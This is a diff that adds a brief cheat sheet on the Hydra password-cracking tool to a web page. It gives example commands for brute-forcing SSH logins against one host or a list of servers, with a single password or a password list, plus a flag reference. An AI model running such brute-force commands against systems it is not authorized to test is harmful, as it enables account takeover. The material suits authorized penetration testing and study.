@@ -67,7 +67,35 @@
 <pre style="text-align:center;">
 <h3> Hydra Usage </h3>
 
+brute force attacks!!
 
+exist GUI and CLI mode
+
+::: get help
+
+# hydra -h
+
+::: brute force protocol
+
+# hydra -v -l [user] -p [password] -t [numberthreads] [ip_addr][protocol]
+# hydra -v -l b0ydC -p qwerty -t50 10.10.10.1 ssh
+
+::: brute force list of servers
+
+# hydra -v -l b0ydC -p qwerty -t50 -M /usr/servers.txt ssh
+
+::: brute force & use list of passwords
+
+# hydra -v -l b0ydC -P /usr/pass.txt -t50 -M /usr/servers.txt ssh
+
+flags:
+
+-v = verbose
+-l = username
+-p = password
+-P = passwordlist [path to file]
+-t = number of threads
+-M = list of servers
 
 </center>
 </body>
